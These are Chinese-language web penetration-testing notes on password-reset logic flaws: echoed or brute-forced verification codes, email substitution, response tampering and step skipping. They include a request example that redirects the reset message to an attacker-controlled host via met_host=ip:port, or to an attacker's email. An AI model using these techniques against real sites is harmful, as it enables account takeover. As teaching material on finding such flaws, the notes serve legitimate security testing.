4. WEB攻防-密码找回-报告复盘

为了防止用户遗忘密码，大多数网站都提供了找回密码功能。常见的找回密码方式有：邮箱找回密码、根据密码保护问题找回密码、根据手机号码找回密码等。其中密码找回漏洞在逻辑漏洞中占了较大的比例。测试密码找回漏洞与其他逻辑漏洞的方法相同，其中必经的两个步骤是：熟悉业务流程（密码找回过程）与对流程中的HTTP数据包请求进行分析。

# 密码找回-回显验证码&验证码爆破

## 回显验证码

修改密码，任意输入验证码，抓包发现真实验证码就在响应包中

## 验证码爆破

如果验证码为4位，且没有时间限制，就可以尝试抓包改为变量进行爆破

需要根据验证码的复杂程度、时间限制、网站的校验等等

# 密码找回-重定向用户&重定向地址

## 重定向用户

在已创建用户的情况下，已知管理员的邮箱地址，在对自己的密码进行修改时，发送邮箱验证码并抓包，在已经拿到验证码的情况下（因为是发送到自己邮箱的验证码）

在数据包中将自己的邮箱改为管理员的，放包之后，修改的就是管理员密码

原因就是只校验了验证码是否正确，没有把邮箱地址和验证码绑定在一起

## 重定向地址

已知管理员的用户名或者邮箱地址的情况下，尝试修改密码，此时在攻击机监听一个端口

然后在点击修改密码时进行抓包，在请求路径添加一个重定向地址，如下所示：

```
POST /admin/admin/getpassword.php?met_host=ip:port
// 或者如果说数据包没有出现接收者邮箱，是不是可以在请求路径这里添加该参数？或者在数据包中添加？比如：
POST /admin/admin/getpassword.php?email=攻击者接收的邮箱

action=next2&……&admin_mobile=xxxx&admin_email=攻击者接收的邮箱
```

此时放包，攻击机就会接收到重置的邮箱提示信息，只不过不是邮件形式的

# 密码找回-修改响应包&跳过步骤法

## 修改响应包

正常修改密码流程，输入一个错误的验证码并观察返回包，再输入正确的验证码观察返回包

抓包把输入错误的验证码数据响应包改为正确的数据响应包

## 跳过步骤法

正常来讲修改密码步骤应该是这样的：1、向用户绑定的邮箱发送验证码 2、校验邮箱验证码 3、邮箱验证码校验正确进入修改密码阶段

假如我能跳过前面2步，直接执行第3步修改密码操作呢？就是先走一遍正常逻辑，走到第三步修改密码的步骤时，截取该数据包 ，对该数据包进行重放测试(把用户名修改成其他用户)，看看是否能跳过前面验证的步骤

先走一遍找回密码的步骤流程，截取到修改密码的数据包，进行重放
